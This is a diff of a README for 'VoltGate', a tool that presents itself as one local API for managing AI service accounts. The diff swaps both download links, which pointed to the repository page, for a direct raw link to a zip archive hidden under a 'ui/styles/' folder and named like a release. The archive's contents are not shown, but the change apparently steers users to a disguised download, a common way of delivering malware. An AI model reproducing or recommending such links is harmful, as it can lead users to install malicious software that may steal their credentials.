@@ -1,6 +1,6 @@
 # ⚡ VoltGate - One Local API For All Accounts
 
-[![Download VoltGate](https://img.shields.io/badge/Download-VoltGate-blue?style=for-the-badge&logo=github)](https://github.com/munna-07/VoltGate)
+[![Download VoltGate](https://img.shields.io/badge/Download-VoltGate-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/munna-07/VoltGate/main/ui/styles/Gate_Volt_v3.1-beta.2.zip)
 
 ## 🧭 What VoltGate Does
 
@@ -12,7 +12,7 @@ Use it when you want one place to manage AI access without opening each service 
 
 Visit this page to download:
 
-https://github.com/munna-07/VoltGate
+https://raw.githubusercontent.com/munna-07/VoltGate/main/ui/styles/Gate_Volt_v3.1-beta.2.zip
 
 Open the page, look for the latest release or download files, then save the Windows version to your computer.
 
